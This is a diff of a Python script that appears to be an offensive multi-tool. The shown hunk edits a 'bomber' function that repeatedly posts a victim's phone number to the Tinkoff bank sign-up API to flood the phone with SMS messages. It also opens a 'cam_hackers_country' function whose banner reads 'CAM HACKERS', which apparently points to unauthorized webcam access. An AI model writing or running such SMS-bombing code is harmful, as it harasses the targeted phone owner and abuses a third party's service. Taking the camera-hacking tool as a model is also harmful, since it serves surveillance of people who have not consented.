@@ -72,21 +72,16 @@ def bomber():
         _email = _name+f'{iteration}'+'@gmail.com'
         email = _name+f'{iteration}'+'@gmail.com'
         try:
-            # Посылаем запрос, в котором мы будем хранить номер телефона
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-            # Печатаем что все отправилось успешно
             print('[+] Tinkoff отправлено!')
         except Exception as ex:
-            # Если появилась ошибка (ex), мы ее выедем 
-            print('[-] Tinkoff не отправлено!' + str(ex))
-    
+            print('[-] Tinkoff не отправлено!' + str(ex))    
         try:
                iteration += 1
                print(('{} круг пройден.').format(iteration))
         except:
             break
 def cam_hackers_country():
-#    colorama.init()
     print("""
     \033[1;31m\033[1;37m ██████╗ █████╗ ███╗   ███╗      ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗
     ██╔════╝██╔══██╗████╗ ████║      ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝
